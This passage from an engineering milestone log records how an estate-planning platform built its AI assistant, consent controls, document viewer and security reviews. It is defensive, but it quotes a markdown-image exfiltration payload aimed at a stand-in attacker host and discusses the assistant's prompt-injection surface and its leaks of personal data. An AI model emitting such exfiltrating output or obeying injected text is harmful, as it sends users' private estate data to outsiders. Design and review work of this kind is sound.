been silenced by the privacy layer — the turn proceeds and no operator ever
learns an SSN is sitting in an asset title. So the tokenizer REFUSES to map a
value that trips the egress detectors, returning it unchanged for the assertion
to catch. The property holds whatever order the two run in: the tokenizer cannot
be the thing that handles an SSN, so it cannot be the thing that hides one.

The mapping is per-turn, in memory, and never persisted — it is the one artifact
that turns a placeholder back into someone's data. The maps are `#private`
fields rather than TypeScript `private` ones, which is not stylistic: `private`
is erased at compile time, so the maps stayed own enumerable properties and
`Object.values(tokenizer)` handed back every mapped title in plaintext, which a
structured logger or an error serializer reaches without anyone deciding it
should (caught by this module's own spec asserting a property it did not yet
have). The STORED TRANSCRIPT KEEPS REAL TEXT — tokenization is a property of the
provider hop, not of the record — so history is tokenized on the way out (a
title typed in turn 1 carries the same placeholder in turn 5) and the reply is
detokenized before it is persisted or returned. A placeholder the model invented
is left as a harmless literal: no index arithmetic, no nearest match, so a
hallucinated ⟦ASSET_9⟧ can never resolve to someone else's row.

Three recorded limits, stated as gaps rather than solved: `get_document_text` is
NOT tokenized, because it returns the user's own document prose with nothing to
key on — accepted only because the content is the user's own, sits behind its
own larger-disclosure consent scope, and is framed as untrusted data; closing it
needs NER over legal prose, with its own accuracy, cost and vendor questions.
Most PERSON rules are DORMANT, since the peer clients already drop names before
they exist as values here — kept anyway, because the failure this codebase keeps
finding is a client schema widened for a good reason while the privacy layer,
being somewhere else, silently does not follow. And opaque UUIDs are not
tokenized (they are already meaningless outside the platform, and tokenizing
them would force a detokenization path on the INBOUND tool-argument side); the
residual is that a provider retaining logs could observe the same opaque id
across conversations, from which nothing about the user is recoverable.

*The stack wiring, and the credential that deliberately does not exist.* The
assistant becomes the tenth service in the compose stack: port 3009, fourth core
co-tenant, eighth KMS alias (`ai-assistant/kek`), appended to the core migration
chain so one migrator at a time meets a fresh cluster. It is the ONLY service
block with no `*_INTERNAL_TOKEN` at all, in either direction, and the
service-env spec asserts that by scanning its keys rather than by trusting the
mapping. Production omits the container the way it omits Plaid — the compose
profile name is generated, `plannedServices` skips it in host mode, so both
addressings agree — because production config pins `LLM_MODE=anthropic` and no
Anthropic credential exists in this project; a container that boots on an
invented key and fails every turn is worse than an absent one.

NOTHING MINTS AN `ANTHROPIC_API_KEY`, at any layer, and each layer refuses it
differently. The generator writes none (a placeholder is a credential nobody can
present — the zero-holder-edge subtraction from M8 PR4 — and a real one would
put a third-party secret in a generated file AND make a LOCAL stack capable of
sending retrieved estate content off the machine). `serviceProcessEnv` maps
`LLM_MODE` and nothing else. The supervisor scrubs `ANTHROPIC_*` from the
ambient shell, which is the one addition whose absence would be worst: a
developer's own key sitting in their profile would otherwise reach the service
with the largest prompt-injection surface in the product without the explicit
mapping ever deciding it should. And the doctor WARNS on any `ANTHROPIC_*` key
in the generated file. What the doctor deliberately does NOT do is complain
about `LLM_MODE=stub`: the stack can host KMS, S3, a virus scanner and an OCR
engine, but it cannot host a model provider, so the stub is the correct and only
possible development value (PLAID_MODE's position exactly), and a warning on
every dev run is the permanently-red-pipeline mistake the image-scan gate
already refused to make.

Config completes the NOTIFY_MODE timeline the enum started in PR1: production
pins the real adapter by NAMING THE STUB (`!== 'anthropic'`, so a future third
mode is not silently admitted — the KMS/clamd/OCR/SES rule), the key is required
in EVERY environment whenever the mode selects it, and a spec asserts
`ConfigError` never echoes the key value. `LLM_REQUEST_TIMEOUT_MS` is
load-bearing rather than hygienic: a turn holds a pooled connection and the
conversation's row lock across every provider hop, and the SDK retries twice by
default, so worst-case wall clock is roughly the deadline times the attempt
count — sized against the transaction, not against one hop.

**What PR2 does not prove, stated rather than implied.** No Anthropic
credentials exist in this project, so the live adapter has never made a real
call: its entire spec runs against a fake transport (the Plaid live-client
precedent), the local stack runs the stub, and the production rehearsal proves
that the pin refuses to boot without a key — not that a real turn works. The
first genuine provider call is a deployment event, not a test result.

**PR3 — the deterministic analysers.**

This is where the milestone's founding decision gets cashed. Funding
recommendations, missing-document detection, beneficiary-conflict detection and
estate-tax estimation are questions about STRUCTURE — is this asset titled in
the trust, do these shares total 100%, is the estate above the exemption — over
facts the platform already computes. **The analyser computes; the model
explains.** Findings carry enum codes from closed unions, never prose, so a
number on a user's estate-readiness panel is arithmetic rather than a token
sampled from a distribution, an injected instruction in a deed cannot invent a
finding, and two users with the same estate get the same answer.

`src/analysis/` holds four pure functions — no I/O, no Nest, no clock — over
views the peer clients already return:

- **funding** finds the most common failure in estate planning: a trust that was
  drafted, signed and never funded, which controls nothing. Conditional on a
  trust EXISTING (telling a user without one that their assets are not in it is a
  product opinion, not a finding), and it respects `funding_status = na` as the
  owner's own decision.
- **missing documents** separates ABSENT from PRESENT-BUT-NOT-IN-FORCE, because
  a generated unsigned will is the more dangerous of the two — it looks like a
  plan and directs nothing. A revoked or superseded document counts as absent.
- **beneficiary conflicts** finds the one the feature is named for: an asset held
  in trust that ALSO names beneficiaries directly, so the designation passes it
  outside the instrument the owner believes controls their estate. Invisible in
  either place alone; visible only by comparing them.
- **estate tax** reports a GROSS estate against federal and state thresholds, and
  says what it left out (debts, prior gifts, DSUE, trust structures). In an
  inheritance-tax state it reports that exposure exists rather than a number,
  because the rate turns on each recipient's relationship and this platform holds
  beneficiaries as contact ids with no relationship attached.

**The reference-data review gate is the M4 template rule applied to tax law.**
`analysis/reference/estate-tax.ts` states the law — a threshold, a rate — on the
platform's authority, so it carries a sign-off block and the analyser built on it
REFUSES in production while that block holds the `unreviewed-exemplar` sentinel
(the M6/M7 pattern: a capability that cannot be exercised safely answers with a
control firing, not with a plausible number). It runs fully everywhere else,
which is what makes it testable. The missing-document matrix deliberately has NO
such gate, and the line between them is the point: it conditions only on
structure the platform can see and phrases every finding as a fact about the
user's own account. A rule needing a statute to justify it — a state execution
formality, a filing deadline — belongs in reviewed data with the tax table.

**Two surfaces, one core, and a deliberate asymmetry in their consent gates.**
Each analyser is exposed as a model-callable tool AND as a `GET /v1/analysis/*`
route the UI can read with no model involved. The tools require EVERY scope the
analysis touches — they are the first multi-scope tools, so `AssistantTool.scope`
became `scopes` and the executor requires all of them, because an analysis
reading two domains discloses both and a partial run would answer "no conflicts"
from data nobody agreed to share. The routes require only the master switch:
consent scopes gate EGRESS to a third-party provider, and this path sends nothing
anywhere — it fetches on the caller's own bearer, computes in-process, and
returns the result to that same caller, who can already read every input
directly. Requiring the capability scopes there would teach users to grant
provider egress in order to see their own document checklist.

Supporting changes worth recording: `assistant_tool_calls.scope` now stores the
sorted scope SET joined with `:` (one TEXT column, and `SAFE_TOKEN_PATTERN`
admits ':' but not ',' — an array column would have meant backfilling an
append-only table whose UPDATE is revoked); a denial now names the missing
scopes, which are closed-vocabulary constants, so the assistant can say which
switch to turn on; `assistant.analysis.completed` / `.refused` are new audit
actions, because a route-driven analysis has no conversation to anchor a tool
event to and persists nothing; and `packages/money` was EXTRACTED from the assets
service when the analysers became the second consumer of exact decimal
arithmetic — the extraction also fixed a latent sign bug (`moneyToCents('-12.34')`
returned −1166n, unreachable through `MoneySchema` but not through a subtraction).

Proven end to end in the stack: the dev journey grants consent over a real
step-up, reads a live funding analysis and a live estate-tax estimate, sees
`assistant.analysis.completed` land in the verified audit hash chain, and watches
a revoke switch the routes off again. The assistant runs only in the development
profile, so the workflow's exact counts moved 15/4 → 16/4 (dev) and 9/10 → 9/11
(production).

**PR4 — the thin UI: estate readiness and consent.**

The analysis routes PR3 built for a UI had no consumer, which is the shape this
codebase has been bitten by before (M4's legal-hold route sat with zero callers
for three milestones). PR4 closes that with the readiness surface and the
consent controls that gate the assistant at all.

**Chat is deliberately out.** The analysis path works fully in both stack
profiles today; a conversation UI could only ever be demonstrated against the
deterministic stub, because the production profile omits the assistant container
until an Anthropic credential exists. Chat becomes its own PR when there is
something real to talk to.

- **The BFF gains its second non-identity downstream** (`assistant-client.ts`),
  on the assets-client terms: it forwards the caller's own bearer, injects no
  identity header, holds no credential. That matters twice over here, because
  the assistant holds none either — so the whole chain from browser to analyser
  runs on one session's authority.
- **An analysis is a PAYLOAD WITH A STATUS, not a thrown error.** The page asks
  for all four at once, so one 503 must cost its own card rather than blanking
  the set. Four statuses where the service has three: `DISABLED` (the master
  consent switch is off) is the one a user can act on, and collapsing it into
  `UNAVAILABLE` would make the page lie about which happened. What never
  happens at any layer is a failure rendering as an empty finding list.
- **`lib/findings.ts` is where a code becomes a sentence** — reviewed like code,
  identical for every user, and incapable of inventing a finding. Two rules hold
  it honest: every sentence is a fact about the user's own account rather than a
  legal claim (the same line the analysers' reference data holds, and what lets
  this surface ship without a lawyer's sign-off), and every number comes from
  `detail` through `formatMoney`, so money is never parsed. The copy map is
  total over the union, so a new finding code without wording is a compile
  error; an unknown code still gets a safe fallback for the case where a service
  deploys ahead of the app.
- **The consent asymmetry is visible in the UI.** Granting reveals an inline
  step-up prompt and retries the same grant once identity accepts the code —
  the user never leaves the page. Revoking is one click, always: the M6
  emergency-access-denial rule that the protective action must never be harder
  than the permissive one. Every mutation answers with the server's full grant
  set, which the component renders rather than toggling a local boolean —
  absence IS denial, so an optimistic checkbox could show a grant the server
  refused.

**Driving the real app found what jsdom could not** (the M8 PR5 lesson, again).
Rendering the page in a browser surfaced a duplicate React key: findings were
keyed on code + subject ref, and the commonest analysis in the product emits
several `instrument_missing` findings with no subject row at all — "no guardian
designation on file" and "no HIPAA authorization on file" are both that shape.
React's remedy for a duplicate key is to drop or duplicate a child, so a real
finding about someone's estate would have silently vanished. Fixed, with a
regression test that renders exactly that pair. The same pass caught the master
switch's button wrapping under its description while every other row's sat
beside it.

Deliberately no new stack e2e test, so the workflow counts stay 16/4 and 9/11:
the analysis path over real HTTP is already proven by PR3's e2e, and what PR4
adds is one forwarding hop, covered by the BFF suite. Coverage floors ratcheted
from measured runs — bff 80/82/78/82 → 85/84/85/86, web 70/62/64/73 →
79/73/82/83.

**M10 security review.** Six parallel discovery lenses over the merged range
`26a4813..51bc81e` (prompt injection and egress, consent and authorization, the
credential graph, crypto/persistence/audit, the analysers, and the UI/BFF hop),
then TWO adversarial verifiers per candidate on different angles — reachability
in a real production config, and is-it-already-a-documented-decision — both told
to default to refuted. 11 raw candidates, 11 unique, 4 confirmed, 7 refuted.

No zone boundary was weakened, no production fail-fast relaxed, and no
credential reached a service the graph forbids. The M6–M9 pattern held a fifth
time: every confirmed finding sits in machinery M10 introduced, and three of the
four contradict a claim the milestone made about itself.

TWO LENSES DISAGREED ABOUT THE SAME DEFECT, which is worth recording because the
disagreement was the useful part. One confirmed "the turn path consults no
consent"; the other refuted it on the grounds that nothing calls the turn route
— no chat UI, no BFF resolver. Both were right about the code; the refutation was
right about the topology. The finding is real and was fixed, but its reachability
is "when chat ships", not "today".

1. **Conversation history reached the provider untokenized on the first call of
   every turn.** The placeholder map is filled only by the turn's own tool
   results, which arrive AFTER the first `complete()` — so the history pass ran
   against an empty map every time. Since replies are stored detokenized by
   design, those were real titles: turn 1 protected "Mom's house on Elm St"
   inside a structured result and turn 2 shipped it in prose; a turn that called
   no tool shipped the whole transcript raw. Three places claimed otherwise
   (docs/04, CLAUDE.md, and the tokenizer's own docstring), and every existing
   tokenizer test seeded an EMPTY conversation, so all of them passed while the
   cross-turn property did not hold. Fixed by re-deriving the map from the
   conversation's own recorded retrievals (`ToolCallsRepo`, decrypted under the
   same AAD, pushed back through the same rules) before the first provider call.
   A row that no longer opens is skipped rather than fatal — a crypto-shredded
   result must not lock a user out of their own conversation.
2. **The `assistant.enabled` master switch did not gate the conversation
   turn.** The only consent read on that path was per-tool, inside the executor,
   so a user with no consent row — or one who had just switched the assistant
   off — still drove a provider call: the tools denied, but the system prompt,
   the user's text and the replayed transcript crossed TB5 anyway. Combined with
   (1), a turn after revocation re-sent estate prose retrieved while consent was
   live. `takeTurn` now requires the master switch, AFTER the ownership check so
   consent state cannot become an oracle about someone else's account.
3. **"Beneficiary designations look consistent" was shown to an estate where
   nothing carries a designation.** A house, a current account and a car all
   take the empty branch, `conflicts` stays 0, and the affirmative card fired —
   reassurance about a check that examined nothing, on the one card a user acts
   on by doing nothing. Split into two codes, because they are two facts:
   `designations_consistent` (designations were read and they add up) and
   `no_designations_on_file` (there were none to read).
4. **docs/03 §6d credited PR4 with a restricted-markdown rendering constraint
   that does not exist.** It dispositioned model-output exfiltration by pointing
   at a control nobody built — the M4 legal-hold zero-callers shape. The section
   now states the risk as OPEN and names the constraint as a requirement owed by
   whoever ships the chat surface, in the same PR as the first pixel of
   model-authored text.

Also fixed while in there, both found by the sweep and neither a vulnerability:
the "never echoes the provider key" test forced its failure by blanking the key
it then asserted was absent, so the assertion was vacuous; and
`beneficiary-conflicts.ts` contained a LITERAL NUL BYTE as a composite-key
separator, which made git treat the file as binary — so that analyser's logic
shipped through PR #26 with no reviewable diff at all. Keying by nested maps
removes the separator question entirely.

### M11 — the assistant conversation surface (shipped)

M10 shipped the assistant service complete and a UI that deliberately stopped
short of chat, leaving the conversation routes with no consumer — the
zero-callers shape M10 was bitten by twice. It also left a debt: the M10 review
reopened docs/03 §6d's model-output exfiltration risk and owed the rendering
constraint "in the same PR as the first pixel of model-authored text". This is
that PR, so the constraint is its opening obligation rather than a follow-up.

**The renderer is the control, and it is an absence rather than a filter.**
`MessageText` builds text nodes: no parser, no allowlist, no dependency, no
`dangerouslySetInnerHTML` — a source scan over the whole app enforces the last
one, with `app/layout.tsx`'s theme script as the single declared exemption (the
credential-graph habit of stating exceptions as data). A model-emitted
`![](https://attacker/?d=…)` renders as those characters. Both roles go through
the same component: the user's own text carries no new risk, but one renderer
for both is what stops a later edit giving the assistant's half a richer path.
Behind it, a CSP with `img-src 'self' data:` and `connect-src 'self'` — honest
about what it does NOT do, since `script-src` still allows inline until Next's
bootstrap gets nonces.

**Two BFF mappings carry meaning.** The assistant's uniform 404 stays uniform
(it is the anti-enumeration control, so "no such conversation" and "someone
else's" must remain indistinguishable), while `assistant_disabled` becomes its
own code — the one refusal a user can act on. A turn also gets its own deadline,
deliberately ABOVE the assistant's per-provider-call bound: a BFF that gave up
first would abandon a turn the service is still committing, with the
conversation's row lock held, and report failure for an answer that then lands
in the transcript unread.

**Consent is rendered as a state, not discovered as an error.** With the master
switch off — which the turn route now refuses outright, per the M10 review — the
composer is replaced by an explanation and a link. A box that takes what you
type and throws it away is the worse answer.

**Running the real app found a defect again**, the third milestone in a row.
`gqlRequest` answers `ok` for any `data` object, so an ordinary version skew
between client and BFF arrives as `{"data":{}}` — and dereferencing it
white-screened the page. The panel now treats a response missing its fields as
NO DATA rather than as data (the peer-client rule, applied in the browser):
"we couldn't load this" beats a blank screen, and beats an empty list that reads
as a claim about the account.

The stack e2e extends the existing dev-journey test rather than adding one, so
the workflow counts stay 16/4 and 9/11: a real conversation over HTTP, the
encrypted transcript read back in order, `assistant.turn.completed` in the
verified audit chain, and — the M10 review's fix, asserted live — the turn route
refusing once consent is revoked.

**M11 security review.** Three focused lenses over the merged range
`dee0cff..557cef2` — the renderer and CSP, the BFF hop and its error taxonomy,
the chat UI's state and consent gate — then two adversarial verifiers per
candidate, both defaulting to refuted. 8 raw, 8 unique, **2 confirmed (the same
defect found twice), 6 refuted**. Sized to a single-PR range rather than
repeating M10's six-lens sweep over code M11 did not touch.

**THE EDGE TIMEOUT WAS BACKWARDS, and its comment said the opposite.**
`TURN_TIMEOUT_MS = 150_000` claimed to sit "deliberately ABOVE the assistant's
own deadline" so the BFF would never abandon a turn the service was still
committing. Two multipliers were missed: the SDK's `maxRetries` defaults to 2
with the timeout applied PER ATTEMPT (~180s for one call), and a turn makes up
to six calls with tool reads between them (a ceiling near eighteen minutes). A
verifier corrected the framing precisely — the literal sentence was true, since
150s does exceed the 60s per-call bound; what was false was the RATIONALE both
the code and CLAUDE.md restated.

The consequence was not a slow request. Nothing cancels the server side when a
client aborts, so the turn committed anyway: both messages sealed,
`assistant.turn.completed` emitted, the estate payload already across TB5 —
while the user was told it failed and invited to retry. The retry then blocked
on the conversation's `FOR UPDATE` lock and re-sent a longer transcript to the
provider: a second egress nobody authorized, and a transcript recording an
exchange the user was told never happened, in a product where the transcript is
evidence.

Fixed by making the invariant a fact rather than a claim.
`packages/contracts/src/assistant-timing.ts` owns one number: the service
enforces `ASSISTANT_TURN_BUDGET_MS` as a WALL CLOCK across its whole loop
(checked before each provider call, answering with its own distinct message so
"this took too long" is not confused with the iteration cap), the SDK's
`maxRetries` is pinned rather than inherited, and the BFF waits
`assistantTurnTimeoutMs()` — derived from the same constant plus headroom. A
spec on each side pins its half, including that the headroom is too small to
hide another whole turn.

Two refuted findings were fixed anyway, because both contradicted claims M11
made about itself: `startConversation` dereferenced its response without the
shape guard the milestone said it applied everywhere (the guard held in two
call sites out of three), and the CSP shipped `'unsafe-eval'` in every
environment while the rationale justified only inline hydration — a directive
nobody had explained, which is how a relaxation outlives its reason. It is
development-only now, and `csp.test.ts` pins the whole policy including the
sentence admitting what it does NOT do.
### M12 — the documents surface (PR1 in progress)

M4 shipped the document service complete: eleven owner-facing routes, a
template matrix, a generation pipeline, an upload gate, an encrypted search
index. Nothing has ever called any of them. That is the zero-callers shape this
repo has now been bitten by three times (M4's own legal hold, M10 PR3's
analysis routes, M11's conversation routes), and M10/M11 made it incoherent
from the user's side as well: the readiness page tells someone "no guardian
designation on file" or "your will has not been executed" and the product gives
them no way to act on either.

**Two PRs.** PR1 is read + generate (the template catalog, the list, one
document with its version history, reading a version, generating, revising).
PR2 is upload + search + the execution ladder + deletion — everything that
changes an existing document or admits new bytes.

**The viewer is the load-bearing decision, and it is CONTAINMENT rather than
absence.** M11 settled that model output renders as text nodes with no parser;
a document cannot be a document under that rule, so `DocumentViewer` hands the
stored bytes to a `srcdoc` iframe with `sandbox=""` — the strictest value,
granting no scripts, no same-origin, no forms, no navigation — and lets three
layers hold it: the sandbox, the page's own CSP (a `srcdoc` frame inherits it,
so `img-src 'self' data:` applies inside), and the Chromium-only `csp`
attribute as defence in depth that is explicitly not the thing being relied on.
The component reads nothing; there is no `dangerouslySetInnerHTML` (the M11
source scan still passes over the new files) and no parser to misconfigure.
What it costs is stated where it lands: the document renders with default
styling in a fixed-height scrolling region, because neither a stylesheet nor
self-sizing can cross the boundary without loosening it. A SECOND FENCE ships
with it — a source scan asserting `DocumentViewer.tsx` is the only file in the
app that renders an `<iframe>` — because the way this regresses is not an edit
to the viewer, it is a second frame added elsewhere for a preview.

**Nothing on this surface prefetches content.** Every content read is an
audited decrypt downstream (`crypto.field.decrypted` plus
`document.content.viewed`) and a KMS operation. So the list is metadata only,
the detail page loads metadata and history but never opens a version, there is
no field on `Document` that resolves content, and pressing Read again asks
again rather than serving a cache — when the event IS the record of who looked
at what, a "free" second read is a lie about the audit trail. Asserted, not
just intended: the panel specs check that listing issues no content call.

**Three BFF mappings carry meaning.** `template_not_found` is kept apart from a
missing document (both 404s, opposite facts: one is about the catalog, the
other about the caller's own account). `content_erased` gets its own code
because the answer is permanent and a retry affordance would have someone
pressing it forever against a key destroyed on purpose. And the two 409s stay
separate — "revoke or supersede first" and "reload, this moved" have different
remedies. A plain 403 is additionally NARROWED to the uniform not-found at this
edge: the service answers 404 for a document that does not exist and 403 for
one that exists and is somebody else's, which is its own M4-review 404-vs-403
follow-up; collapsing them here helps browser traffic and does NOT close the
service-level finding, which stands for every other caller.

**Intake is a typed GraphQL input, not the JSON scalar.** The readiness surface
uses `JSON` for a finding's detail, but that is an OUTPUT of data the service
already validated. Putting an untyped shape on the one mutation that reaches a
legal instrument's renderer would be the opposite trade, so `generateDocument`
takes `[DocumentVariableInput!]!` and the BFF refuses a variable carrying
neither value or both, and refuses a duplicate name rather than letting
last-write-wins decide which answer reaches the document. What a variable may
CONTAIN is deliberately not re-checked there: that is the template's
declaration to enforce, and a second copy of a legal gate is a copy that
drifts.

**Answers are not persisted, and revision inherits that.** M4's decision is
that the encrypted rendered artifact is the record and the intake variables are
not kept, so creating a new version means filling the form again. The revise
route says so in as many words rather than letting it read as a bug — keeping a
plaintext copy of the answers would create a second, unencrypted home for
exactly the facts the document exists to protect.

**No new stack e2e, deliberately, and the counts stay 16/4 and 9/11.** PR1 adds
no service behaviour — every route it calls has been under e2e since M4. What
is new is a consumer, and the consumer's proof is the browser, the same
standing this repo gives the M8 PR5, M10 PR4 and M11 UI work. Coverage floors
were RATCHETED from a measured run (82.26/78.88/85.65/85.90 → 82/78/85/85),
never lowered.

**PR2 — upload, search, the execution ladder, deletion.**

*The one service change, and why it is not scope creep.* The execution ladder
is parameterized by the template's `execution_requirements`, which live in the
sha256-verified template SOURCE — so only the document service can compute what
a given instrument in a given state may do next. A UI that hardcoded the ladder
would be a second copy of a legal gate (docs/03 risk #8), and it would drift
toward offering a will a no-witness path. So `GET /v1/documents/:id` gained
`allowedTransitions`, computed by the service's own `allowedTransitions()` from
its own `requirementsFor()`. It FAILS CLOSED as an EMPTY LIST rather than an
error: `requirementsFor` refuses to guess when the template cannot be verified,
and that refusal must not be softened — but failing the whole READ would make
an intact document unopenable because of its template's state. The empty list
is advisory anyway; `transitionStatus` re-resolves the requirements inside its
own transaction and refuses there too. Not on the LIST DTO: it costs a template
load per document, and a list is not where anyone attests anything. The
transition's own response carries the NEW ladder, so a client never renders a
stale one for a round trip.

*Upload keeps three refusals apart.* `malware_detected`, `unsupported_content`
and `scan_unavailable` all mean the same thing about storage — the pipeline is
pre-storage and fail-closed, so nothing was written anywhere — and three
different things to the person holding the file. The malware one is never
softened into "that file type isn't supported": the user may be holding
something somebody sent them. The client invents NO type check of its own
(the server's magic-byte sniff is the control against polyglot mislabeling, and
a second opinion could disagree with it); `accept` is a picker hint, `file.type`
is forwarded as a DECLARATION, and the only local check is the size cap, which
mirrors the server's number rather than adding a rule.

*Search says what it is not.* Nothing is decrypted to answer a query — it is
per-user HMAC tokens matched ciphertext-side, which is why searching produces
no decrypt event where reading produces one. The cost is stated where the user
meets it: whole indexed words only, no semantic match, because there is
deliberately no embedding index (M10). A search that matched nothing says
"nothing matched", never the empty-estate copy — one is a fact about the query,
the other a claim about the account.

*Driving the real app found a fourth browser-only defect, and a fifth in the
same pass.* (1) The step-up guard runs at documents' CONTROLLER while the legal
hold is checked inside the handler, so a stale session gets `stepup_required`
FIRST and the hold only after — the page dutifully walked someone through
finding their authenticator to be told, correctly, that the document could not
be deleted anyway. The server ordering is fine as defence in depth; offering
the action was not, and the page already knows the document is held. Deletion
is now not offered at all for a held document, on the same rule the revise link
follows. (2) The panel dereferenced `allowedTransitions` before checking it, so
a BFF that predates the field would have white-screened the page — the M11
shape for the third time. It now reads a missing ladder as NO DATA rather than
as an empty one, because an empty ladder is a REAL answer (fail-closed) and a
skew must not be indistinguishable from it.

**M12 security review** (five focused discovery lenses over `f06a157..HEAD`,
then TWO adversarial verifiers per candidate on different angles —
reachability in a real production config, and is-it-already-a-documented-
decision — both told to default to refuted; 17 raw, 17 unique, 10 verified
under the run's fan-out cap, 4 confirmed, and the 7 the cap dropped were
logged by name rather than silently truncated). No zone boundary weakened, no
production fail-fast relaxed, no credential reaching a service the credential
graph forbids. The M6–M11 pattern held a sixth time: every finding sits in
machinery M12 introduced, and four of them falsify a claim M12 made about
itself.

*The load-bearing one inverted a rule this repo wrote down.* Failing closed on
an unverifiable template withdrew the WHOLE transition set — but
`allowedTransitions` computes `revoked` and `superseded` without ever reading
the requirements, so a soft-deleted or integrity-failed template stripped the
owner's only de-escalation, permanently, in both the read and the write. A
signed will could then never be revoked, never superseded, and never
regenerated (`allowsNewVersion` is false past `generated`). That is the M6 rule
— the protective action must never be harder than the permissive one — turned
upside down by a fix meant to be conservative. `deEscalationTransitions` is now
the fallback, and THE LINE IS ADVANCE vs DE-ESCALATE rather than
requirement-dependent vs not: `signed` is technically requirement-independent
and is still withheld, because advancing asserts something about the world on a
template nobody can vouch for. The set is asserted to be a strict subset of the
real ladder under every profile.

*A tamper detector that produced nothing.* The same bare `catch` swallowed
`TemplateIntegrityError` — the signal `body_sha256` exists to raise (docs/03
TB4) — identically to a transient DB error, on a read path that answers 200 and
logs nothing by design. It is now audited under its own action,
`document.template.integrity_failed`, emitted where it is CAUGHT because that is
the only place it exists.

*The questionnaire and the formalities came from unverified columns.* Two lenses
independently found that `GET /v1/templates` served `templates.variables` and
`templates.execution_requirements` straight off the row with a shape-only
re-validation, while the generator's docstring claimed they were "content-pinned
by sha256" and the copy table called the formalities "the attorney-signed-off
column". The M4 review made the verified SOURCE authoritative for the
formalities GATE; the DISPLAY had been left behind, so a tampered row could put
a different set of questions and a different statement of what a will requires
in front of an owner. The catalog now serves `TemplateEngine.load`'s verified
parse, and a template that fails verification is OMITTED rather than degraded.

*Also fixed:* the three write paths (generate, regenerate, upload) lacked the
"a response missing its field is not data" guard every read path in the same
milestone applies — so a version skew after a real side effect left the form
idle with no error, inviting a second press and a second legal instrument;
`Read` was offered for versions the viewer would then refuse to display,
manufacturing audited decrypts that produced nothing (and leaving PR1's promise
that "presenting uploaded binaries is PR2's problem and gets its own decision"
undischarged — images now render inline from a `data:` URI, PDFs and TIFFs
download, and the decision is written down); the ladder caption claimed
template authority for uploaded documents, which have no template at all; the
transition's returned ladder was discarded in favour of a re-read that three
separate places claimed did not happen; the embedding fence matched
`/<iframe[\s>]/` only, missing `<iframe/>`, `React.createElement('iframe')`,
`<object>` and `<embed>`; and the SEARCH TERM travelled in a query string —
by construction a word out of the user's estate, on the one part of a request
CloudFront and WAF log by default — so the route became a POST with the term in
the body.

*Corrected rather than fixed:* docs/03 §6e claimed `dangerouslySetInnerHTML` was
absent "anywhere in the app", dropping M11's one declared exemption.

*Noted, then closed:* `TemplateEngine` cached a parsed source by (id, sha) with
no expiry, so a body swapped under an unchanged pin was served from cache until
the process restarted — M4's caching property, predating this milestone, and
first recorded here as a follow-up. It was closed immediately after, because
the framing that made it look minor stopped being true in this milestone. The
key COMMITS TO THE CONTENT (an entry can only be a parse whose bytes hashed to
the sha in its own key, and a published version is immutable), so a warm cache
never could serve a tampered parse — this was never a correctness hole. What it
cost was DETECTION: the process stopped looking at the object, and M12 had just
given that check an audit event. An alarm wired to a check that only runs on
cold starts is an alarm that mostly does not run. Entries now expire after
`TEMPLATE_CACHE_TTL_MS` (5 minutes, a reviewed constant because it is a
detection-latency parameter rather than a performance knob), and the map is
bounded at `TEMPLATE_CACHE_MAX_ENTRIES` because publishing a version mints a NEW
ROW, so the key space grows for the life of the process. The consequence is MORE
fail-closed, not less: past the TTL a tampered body makes `load` throw where it
used to serve the good cached parse, and all three callers were already built
for that throw. Still not closed, stated rather than implied: within one TTL a
warm process neither serves nor notices a swap; closing that means verifying on
every load, which is N object-store reads per catalog request on a user-facing
route. A cold replica still detects immediately. Both halves are
mutation-tested — removing the TTL turns three specs red, removing the bound
turns a fourth red.

*Proven live against the stack, through the browser:* real clamd refused the
signature-carrying PNG with nothing stored (`document.scan.rejected`), a clean
scan stored and OCR-indexed (`document.uploaded` + `document.ocr.indexed`),
encrypted search found it by a word that appears only in the image, the CA
ladder walked generated → signed → witnessed → executed with the date field
appearing at exactly the last rung (three `document.status.changed`), and
deletion took a real step-up (`auth.stepup.granted` → `document.deleted`) and
left the row soft-deleted rather than gone. The review's fixes were re-driven
the same way: an uploaded scan now renders inline from a `data:` URI with a
`Save a copy` whose filename comes from ids, the uploaded document's caption
no longer claims template authority, POST search still finds it, and the audit
chain shows exactly one decrypt pair for the one Read and none for the search.

Coverage floors ratcheted from measured runs, never lowered: web 83/79/85/86,
bff 88/85/88/88. Stack e2e test COUNTS are unchanged (16/4 and 9/11) — the
search calls in `apps/e2e` changed shape with the route, but no test was added
or removed.

### M13 — the people surface (PR1 shipped)

M2 shipped the profile & contacts service complete: fifteen owner-facing routes
across three controllers, field-encrypted profiles, family members, contacts,
role assignments, permission grants, and the platform's first Cedar PEP. Nothing
has ever called any of them. That is a LARGER zero-callers gap than the one M12
just closed, and the fourth instance of the shape (M4's legal hold, M10 PR3's
analysis routes, M11's conversation routes, M12's whole reason for existing).
The BFF has no `PROFILE_URL` and no profile client; `AppNav.tsx` renders People
as an inert "Soon" span.

It is incoherent from the user's side in exactly M12's way. The readiness page
emits `state_of_residence_unknown` and `minor_status_unknown` — the product
telling someone "we don't know a fact about you" with no way to tell us — and
M12's generator asks the user to pick a state by hand, a workaround introduced
*because* the BFF has no profile downstream.

**Three PRs, and the order is the point.** PR1 hardens the shipped service with
no new surface. PR2 is the UI over the hardened service. PR3 is the contact-link
ceremony, alone, with its own docs/03 delta.

#### PR1 — harden the shipped service (six defects, not the three that were known)

Three were known going in. Three more came out of reading the service against
the docs, and two of those are the SAME SHAPE as the first — a write path that
destroys data it was never given.

1. **No `StepUpGuard` anywhere in profile.** `POST /v1/role-assignments` granted
   trustee/executor/beneficiary with `CallerGuard` only, while docs/01 §5 names
   "trustee/executor changes, beneficiary changes" as mandatory step-up and the
   sibling route in assets (`beneficiaries.controller.ts`) already complied. M2
   shipped this before `@estate/auth-guard` existed and nothing revisited it; no
   decision-log entry ever exempted it. The gate now covers grant, revoke and
   permission-attach, UNIFORMLY across all twelve roles — a guard cannot branch
   on the body without becoming a weaker copy of the schema, and a table of
   "which roles are sensitive" is a table that drifts (`agent_financial` is a
   power of attorney; `viewer` still reads an estate).
2. **Editing a contact cleared its platform link.** `contacts.service.ts`
   hardcoded `linked_user_id: null` in the one `encryptRow` feeding BOTH insert
   and update, and the repo's UPDATE wrote that column. The link is an
   authorization EDGE — being a linked contact is what makes someone able to open
   a death case (docs/03 §6b) and what makes an executor resolvable (M7) — so
   changing a phone number revoked a §5.1 control with no audit event and no
   owner decision. Fixed by TYPE: `ContactFields`, the shape both statements are
   built from, has no such key, so the ordinary write path has no field in which
   to say anything about the link.
3. **Permission grants were write-only.** `POST .../permissions` existed with no
   GET, no revoke, `listByRoleAssignment` at zero callers, and no
